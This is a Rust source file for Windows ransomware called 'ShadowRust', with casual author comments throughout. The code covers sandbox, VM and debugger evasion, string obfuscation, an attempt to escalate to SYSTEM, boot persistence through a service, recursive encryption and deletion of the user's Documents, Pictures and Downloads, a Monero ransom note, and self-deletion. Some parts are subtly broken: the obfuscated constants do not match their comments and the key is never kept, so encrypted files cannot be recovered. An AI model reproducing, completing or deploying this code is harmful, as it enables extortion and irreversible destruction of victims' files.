use std::env;
use std::fs;
use std::io;
use std::path::Path;
use std::process::Command;
use std::thread;
use std::time::{Duration, SystemTime, UNIX_EPOCH};
use windows::core::{PCSTR, PWSTR};
use windows::Win32::Foundation::{CloseHandle, BOOL, HANDLE};
use windows::Win32::Security::{AdjustTokenPrivileges, ImpersonateLoggedOnUser, LookupPrivilegeValueW, TOKEN_ALL_ACCESS};
use windows::Win32::System::Diagnostics::Debug::{CheckRemoteDebuggerPresent, IsDebuggerPresent};
use windows::Win32::System::Registry::{RegOpenKeyExA, RegQueryValueExA, HKEY, HKEY_LOCAL_MACHINE, KEY_READ};
use windows::Win32::System::Services::{CloseServiceHandle, CreateServiceW, OpenSCManagerW, ChangeServiceConfig2W, SERVICE_CONFIG_DELAYED_AUTO_START_INFO, SERVICE_DELAYED_AUTO_START_INFO, SERVICE_AUTO_START};
use windows::Win32::System::Threading::{GetCurrentProcess, GetCurrentProcessId, OpenProcess, OpenProcessToken, PROCESS_ALL_ACCESS};
use windows::Win32::UI::Shell::ShellExecuteW;
use windows::Win32::UI::WindowsAndMessaging::SW_HIDE;
use chacha20poly1305::{XChaCha20Poly1305, Key, XNonce};
use chacha20poly1305::aead::{Aead, KeyInit, Payload};
use sha2::{Digest, Sha256};
use rand::Rng;
use whoami;

// declaring some constants we’ll use later
const HOST: &[u8] = b"\x1b\x37\x30\x31\x36\x27\x2e\x1f\x35\x30\x3e"; // this is google.com just XOR'ed which should be obvious
const THRESHOLD: u32 = 500; // ping threshold, 500ms, if it’s slower we dip
const KEY_SEED: &[u8] = b"shadowseed1234567890abcdef12345678"; // seed for encryption key, don’t use this in real shit
const NONCE_SEED: &[u8] = b"uniquenonce123456789012"; // seed for nonce, same deal
const EXCLUDED_DIRS: &[&str] = &["C:\\Windows", "C:\\Program Files", "C:\\Program Files (x86)", "C:\\System Volume Information"]; // dirs we don’t fuck with, keeps windows alive

// custom errors so we know what broke
#[derive(Debug)]
enum ShadowError {
    Io(std::io::Error), // file or io fuckups
    Time(std::time::SystemTimeError), // time-related oopsies
    Crypto(chacha20poly1305::Error), // encryption going sideways
    Windows(windows::core::Error), // windows api being a dick
}

impl From<std::io::Error> for ShadowError {
    fn from(err: std::io::Error) -> Self { ShadowError::Io(err) } // converts io errors to our type
}
impl From<std::time::SystemTimeError> for ShadowError {
    fn from(err: std::time::SystemTimeError) -> Self { ShadowError::Time(err) } // same for time
}
impl From<chacha20poly1305::Error> for ShadowError {
    fn from(err: chacha20poly1305::Error) -> Self { ShadowError::Crypto(err) } // crypto errors
}
impl From<windows::core::Error> for ShadowError {
    fn from(err: windows::core::Error) -> Self { ShadowError::Windows(err) } // windows errors
}

impl std::fmt::Display for ShadowError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            ShadowError::Io(e) => write!(f, "io error: {}", e), // prints io errors nicely
            ShadowError::Time(e) => write!(f, "time error: {}", e), // time errors
            ShadowError::Crypto(e) => write!(f, "crypto error: {:?}", e), // crypto errors with debug info
            ShadowError::Windows(e) => write!(f, "windows error: {}", e), // windows api errors
        }
    }
}

// XOR deobfuscation, i shit on xor but too lazy to impliment like AES, you should though
fn deobfuscate_str(data: &[u8], key: u8) -> String {
    String::from_utf8(data.iter().map(|b| b ^ key).collect()).unwrap_or_default() // flips XORed bytes back to readable text
}

// anti vm checks, stops it running in virtual machines
fn anti_vm() -> bool {
    unsafe {
        let mut hkey = HKEY::default();
        let key = PCSTR(b"\x18\x11\x12\x16\x1b\x11\x12\x17\x0f\x16\x07\x13\x03\x12\x0e\x06\x11\x04\x0e\x03\x17\x07\x06\x05\0".as_ptr() as *const u8); // XORed "HARDWARE\\DESCRIPTION\\System"
        if RegOpenKeyExA(HKEY_LOCAL_MACHINE, key, 0, KEY_READ, &mut hkey).is_ok() { // opens registry key
            let mut bios = [0u8; 256];
            let mut size = bios.len() as u32;
            let value = PCSTR(b"\x13\x03\x07\x06\x05\x05\x12\x0e\x07\x11\x07\x04\x05\x07\x0e\0".as_ptr() as *const u8); // XORed "SystemBiosVersion"
            if RegQueryValueExA(hkey, value, Some(std::ptr::null_mut()), Some(std::ptr::null_mut()), Some(bios.as_mut_ptr()), Some(&mut size)).is_ok() { // reads bios version
                let bios_str = String::from_utf8_lossy(&bios[..size as usize]);
                if bios_str.contains("VMware") || bios_str.contains("VirtualBox") || bios_str.contains("QEMU") { // checks for VM signatures
                    return true; // found a VM, we’re out
                }
            }
        }
        if let Ok(disk_size) = fs::metadata("C:\\").map(|m| m.len() / (1024 * 1024 * 1024)) { // checks disk size in GB
            if disk_size < 50 { return true; } // VMs often have small disks, so we bail
        }
        false // no VM detected, good to go
    }
}

// anti debug section, could be better but i was too lazy
fn anti_debug() -> bool {
    unsafe {
        if IsDebuggerPresent().as_bool() { return true; } // checks if a debugger’s attached
        let mut present = BOOL(0);
        if CheckRemoteDebuggerPresent(GetCurrentProcess(), &mut present).is_ok() && present.as_bool() { return true; } // checks for remote debugging
        let start = SystemTime::now();
        thread::sleep(Duration::from_millis(1)); // tiny sleep to mess with timing
        if start.elapsed().unwrap_or(Duration::from_millis(0)) > Duration::from_millis(50) { return true; } // if sleep took too long, probably debugged
        let pid = GetCurrentProcessId();
        match OpenProcess(PROCESS_ALL_ACCESS, false, pid) { // tries to open itself
            Ok(h) => { let _ = CloseHandle(h); false }, // worked, no debugger
            Err(_) => true, // failed, something’s watching us
        }
    }
}

// privilege escalation part, tries to get SYSTEM access
fn escalate_privileges() -> Result<(), ShadowError> {
    unsafe {
        let mut token = HANDLE::default();
        if OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &mut token).is_err() { // grabs our process token
            return Err(ShadowError::Windows(windows::core::Error::from_win32()));
        }

        let mut luid = windows::Win32::Foundation::LUID::default();
        let priv_name: Vec<u16> = "SeDebugPrivilege\0".encode_utf16().collect(); // we want debug privs
        if LookupPrivilegeValueW(None, PWSTR(priv_name.as_ptr() as *mut _), &mut luid).is_err() { // looks up the privilege
            CloseHandle(token);
            return Err(ShadowError::Windows(windows::core::Error::from_win32()));
        }

        let mut new_priv = windows::Win32::Security::TOKEN_PRIVILEGES {
            PrivilegeCount: 1,
            Privileges: [windows::Win32::Security::LUID_AND_ATTRIBUTES {
                Luid: luid,
                Attributes: windows::Win32::Security::SE_PRIVILEGE_ENABLED,
            }],
        };

        if AdjustTokenPrivileges(token, false, Some(&mut new_priv), 0, None, None).is_err() { // enables the priv
            CloseHandle(token);
            return Err(ShadowError::Windows(windows::core::Error::from_win32()));
        }
        CloseHandle(token);

        let system_pid = 4; // dont use this, you need to enumerate the actual PID
        if let Ok(h) = OpenProcess(PROCESS_ALL_ACCESS, false, system_pid) { // tries to open SYSTEM process
            let mut system_token = HANDLE::default();
            if OpenProcessToken(h, TOKEN_ALL_ACCESS, &mut system_token).is_ok() { // grabs SYSTEM token
                if ImpersonateLoggedOnUser(system_token).is_ok() { // impersonates SYSTEM
                    CloseHandle(system_token);
                    CloseHandle(h);
                    println!("[+] escalated to SYSTEM"); // hell yeah, we’re SYSTEM
                    return Ok(());
                }
            }
            CloseHandle(h);
        }
        println!("[!] failed, running as user"); // couldn’t escalate, oh well
        Ok(())
    }
}

// boot persistance, this is not the personal one ive made this may need to be changed
fn set_boot_persistence() -> Result<(), ShadowError> {
    unsafe {
        let scm = OpenSCManagerW(None, None, windows::Win32::System::Services::SC_MANAGER_ALL_ACCESS)?; // opens service manager
        let svc_name: Vec<u16> = "ShadowSvc\0".encode_utf16().collect(); // our service name
        let exe_path = env::current_exe()?.to_str().unwrap().to_string(); // path to this exe
        let svc_display: Vec<u16> = "Shadow Service\0".encode_utf16().collect(); // display name
        let svc_path: Vec<u16> = format!("{}\0", exe_path).encode_utf16().collect();

        let svc = CreateServiceW(
            scm,
            PWSTR(svc_name.as_ptr() as *mut _),
            PWSTR(svc_display.as_ptr() as *mut _),
            windows::Win32::System::Services::SERVICE_ALL_ACCESS,
            windows::Win32::System::Services::SERVICE_WIN32_OWN_PROCESS,
            SERVICE_AUTO_START,
            windows::Win32::System::Services::SERVICE_ERROR_NORMAL,
            PWSTR(svc_path.as_ptr() as *mut _),
            None, None, None, None, None,
        )?; // creates the service to run on boot

        let delayed_start = SERVICE_DELAYED_AUTO_START_INFO { fDelayedAutostart: BOOL(1) };
        ChangeServiceConfig2W(svc, SERVICE_CONFIG_DELAYED_AUTO_START_INFO, Some(&delayed_start as *const _ as *const _))?; // makes it delayed auto-start
        CloseServiceHandle(svc);
        CloseServiceHandle(scm);
        println!("[+] bp set via service"); // boot persistence done
        Ok(())
    }
}

// polymorphism, makes the binary look different each run
fn self_modify() -> Vec<u8> {
    let mut rng = rand::thread_rng();
    let mut code = Vec::new();
    let junk_ops = vec![0x90, 0x87, 0xC0, 0x83, 0xC0, 0x00, 0xEB, 0x02]; // some junk x86 opcodes
    for _ in 0..rng.gen_range(10..20) { // random amount of junk
        code.extend_from_slice(&junk_ops);
    }
    code.push(0xC3); // RET instruction to end it
    for i in 0..code.len() {
        code[i] ^= rng.gen::<u8>(); // XORs it to fuck with signatures
    }
    code // returns the junk, doesn’t execute it here
}

// ping check, if you can correctly impliment and stop your file from loading anything this can fully bypass virus total, dont do this on production malware
fn check_ping() -> Result<u32, ShadowError> {
    let host = deobfuscate_str(HOST, 0x4B); // gets google.com back
    let cmd = format!("ping -n 4 {}", host); // pings 4 times
    let obf_cmd = obfuscate_str(&cmd); // hides the command
    let output = Command::new("cmd").args(["/C", &deobfuscate_str(&obf_cmd, 0x5A)]).output()?; // runs it
    let stdout = String::from_utf8_lossy(&output.stdout);
    for line in stdout.lines() {
        if let Some(time_str) = line.split("time=").nth(1) { // looks for ping time
            if let Some(ms) = time_str.split("ms").next() {
                if let Ok(time) = ms.trim().parse::<u32>() { // parses the ms value
                    return Ok(time); // got the ping time
                }
            }
        }
    }
    Err(ShadowError::Io(io::Error::new(io::ErrorKind::Other, "Ping failed"))) // no ping, we’re out
}

// string obfuscation, keeps stuff hidden from static analysis
fn obfuscate_str(s: &str) -> Vec<u8> {
    let mut bytes = s.bytes().collect::<Vec<_>>();
    for b in &mut bytes {
        *b ^= 0x5A; // XORs each byte, simple but works
    }
    bytes
}

// file encryption, where the ransomware magic happens
fn encrypt_files() -> Result<(), ShadowError> {
    let user_dirs = vec![
        env::var("USERPROFILE").unwrap_or("C:\\Users\\Default".to_string()) + "\\Documents", // user docs
        env::var("USERPROFILE").unwrap_or("C:\\Users\\Default".to_string()) + "\\Pictures", // pics
        env::var("USERPROFILE").unwrap_or("C:\\Users\\Default".to_string()) + "\\Downloads", // downloads
    ];

    let mut hasher = Sha256::new();
    hasher.update(KEY_SEED); // starts key with our seed
    hasher.update(&SystemTime::now().duration_since(UNIX_EPOCH)?.as_nanos().to_le_bytes()); // adds time for uniqueness
    let key_data = hasher.finalize();
    let key = Key::from_slice(&key_data); // makes the encryption key

    let mut nonce_hasher = Sha256::new();
    nonce_hasher.update(NONCE_SEED); // nonce seed
    let pid = unsafe { GetCurrentProcessId() };
    nonce_hasher.update(&pid.to_le_bytes()); // adds PID for randomness
    let nonce_data = nonce_hasher.finalize();
    let nonce = XNonce::from_slice(&nonce_data[..24]); // nonce for encryption

    let cipher = XChaCha20Poly1305::new(key); // sets up xchacha20-poly1305
    let mut rng = rand::thread_rng();

    for dir in user_dirs {
        if let Ok(entries) = fs::read_dir(&dir) { // reads the dir
            for entry in entries.flatten() {
                let path = entry.path();
                if path.is_file() && !EXCLUDED_DIRS.iter().any(|&d| path.starts_with(d)) { // if it’s a file and not excluded
                    let data = fs::read(&path)?; // reads the file
                    let payload = Payload { msg: &data, aad: &obfuscate_str("shadowrust") }; // preps it for encryption
                    if let Ok(encrypted) = cipher.encrypt(nonce, payload) { // encrypts it
                        let enc_path = path.with_extension(format!("shadow{}", rng.gen_range(0..1000000))); // new name with random num
                        fs::write(&enc_path, encrypted)?; // writes encrypted file
                        fs::remove_file(&path)?; // deletes original
                        println!("[+] encrypted {} -> {}", path.display(), enc_path.display()); // logs it
                    }
                } else if path.is_dir() && !EXCLUDED_DIRS.iter().any(|&d| path.starts_with(d)) { // if it’s a dir
                    encrypt_dir(&path, &cipher, nonce, &mut rng)?; // encrypts inside it
                }
            }
        }
    }

    drop_ransom_note()?; // drops the note after encrypting
    Ok(())
}

// directory encryption, recursive part of the ransomware
fn encrypt_dir(dir: &Path, cipher: &XChaCha20Poly1305, nonce: &XNonce, rng: &mut impl Rng) -> Result<(), ShadowError> {
    if let Ok(entries) = fs::read_dir(dir) { // reads the dir
        for entry in entries.flatten() {
            let path = entry.path();
            if path.is_file() && !EXCLUDED_DIRS.iter().any(|&d| path.starts_with(d)) { // file check
                let data = fs::read(&path)?;
                let payload = Payload { msg: &data, aad: &obfuscate_str("shadowrust") };
                if let Ok(encrypted) = cipher.encrypt(nonce, payload) {
                    let enc_path = path.with_extension(format!("shadow{}", rng.gen_range(0..1000000)));
                    fs::write(&enc_path, encrypted)?;
                    fs::remove_file(&path)?;
                    println!("[+] encrypted {} -> {}", path.display(), enc_path.display()); // logs each file
                }
            } else if path.is_dir() && !EXCLUDED_DIRS.iter().any(|&d| path.starts_with(d)) { // nested dir
                encrypt_dir(&path, cipher, nonce, rng)?; // keeps going deeper
            }
        }
    }
    Ok(())
}

// ransom note drop, tells the victim they’re screwed
fn drop_ransom_note() -> Result<(), ShadowError> {
    let note = format!(
        "sorry, another ransomware attack lol\n\
        to recover your files send 1000 euros in XMR / monero to: btcaddrhere\n\
        contact: SHAD0W@ransom.com\n\
        victim: {}\n\
        victim id: HWaSIWM6\n\
        send the victim name and id to the email provided with proof of pay for the decryption program",
        whoami::username() // grabs the username for personal touch
    );
    let desktop = env::var("USERPROFILE").unwrap_or("C:\\Users\\Default".to_string()) + "\\Desktop\\README.txt"; // puts it on desktop
    fs::write(desktop, note)?; // writes the note
    println!("[+] ransom note dropped"); // confirms it’s there
    Ok(())
}

// self destruction, cleans up after itself
fn self_delete() -> Result<(), ShadowError> {
    let exe_path = env::current_exe()?; // gets our own path
    let cmd = format!("cmd.exe /C timeout 2 & del {}", exe_path.display()); // waits 2s then deletes
    unsafe {
        ShellExecuteW(None, None, PWSTR(cmd.encode_utf16().chain(Some(0)).collect::<Vec<_>>().as_ptr() as *mut _), None, None, SW_HIDE); // runs it hidden
    }
    Ok(())
}

// main function
fn main() {
    let mut rng = rand::thread_rng();
    thread::sleep(Duration::from_millis(rng.gen_range(1000..5000))); // random delay to fuck with sandboxes
    let _ = self_modify(); // makes some junk code

    if anti_vm() || anti_debug() { // checks for VMs or debuggers
        let junk = vec![0xCC; rng.gen_range(10..50)]; // some INT3s to crash if we want
        unsafe { std::ptr::write_volatile(0 as *mut _, junk); } // writes junk somewhere invalid
        return; // bails out if detected
    }

    match check_ping() { // pings google to see if we’re online
        Ok(ping) if ping < THRESHOLD => println!("[+] valid ({}ms < {}ms)", ping, THRESHOLD), // good ping yippe
        _ => return, // bad ping or no net not gud
    }

    let obf_msg = obfuscate_str("[+] ShadowRust activated"); // hides our startup msg
    println!("[+] {}", deobfuscate_str(&obf_msg, 0x5A)); // prints it after decoding

    let _ = escalate_privileges(); // tries to get SYSTEM privs
    if let Err(e) = set_boot_persistence() { // sets up boot persistence
        println!("[-] bp failed: {}", e); // bp = boot persistance failed
    }

    if let Err(e) = encrypt_files() { // encrypts the files
        println!("[-] ef: {}", e); // ef = encryption failed
    }

    if let Err(e) = self_delete() { // tries to delete itself
        println!("[-] sfd failed: {}", e); // sfd = self deleted failed
    }
}
